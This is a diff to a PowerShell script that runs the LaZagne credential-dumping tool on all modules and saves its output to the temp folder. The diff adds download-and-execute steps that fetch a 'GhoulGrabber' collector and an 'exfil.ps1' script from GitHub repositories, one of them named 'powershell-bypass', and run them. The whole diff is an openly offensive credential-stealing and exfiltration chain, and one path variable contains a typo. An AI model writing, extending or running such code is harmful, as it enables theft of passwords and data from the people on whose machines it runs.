@@ -136,11 +136,39 @@ if ($windowsFolder -and (Test-Path $windowsFolder)) {
 # ---------------------------
 # Run the Python script
 # ---------------------------
-Write-Host "`nRunning Python script..."
+Write-Host "`nRunning laZagne..."
 try {
     python $pyScript.FullName all | Tee-Object -FilePath (Join-Path $env:TEMP "LaZagne.txt")
 } catch {
     Write-Error "Failed to run Python script: $_"
 }
-
+#-----------------------------------------
+# URL AND DESTINATIONS FOR MODULES
+# ---------------------------------------
 Write-Host "LaZagne successfully ran, loading next module"
+$exfilUrl = "https://raw.githubusercontent.com/GHXSTFPS/powershell-bypass/main/V1/Modules/exfil.ps1"
+$exfilDest = Join-Path $env:TEMP "exfil.ps1"
+$ghoulUrl = "https://raw.githubusercontent.com/GHXSTFPS/GhoulGrabber/main/collect.ps1"
+$ghoulDest = Join-Path $env:TENO "ghoul.ps1"
+#--------------------------------------------
+# GHOUL GRABBER MODULE (DOWNLOAD AND RUN)
+# -------------------------------------------
+Write-Host "Downloading GhoulGrabber and running"
+Invoke-WebRequest -Uri $ghoulUrl -OutFile $ghoulDest
+try{
+	& $ghoulDest
+} catch {
+	Write-Error "Error occured while trying to run Ghoul Script"
+}
+
+#--------------------------------------------
+# EXFIL MODULE BLOCK (DOWNLOAD AND RUN)
+#---------------------------------------------
+Write-Host "Downloading Exfil Script and running"
+Invoke-WebRequest -Uri $exfilUrl -OutFile $exfilDest
+try{
+& $exfilDest
+} catch {
+	Write-Error "Failed to run Exfil script"
+}
+
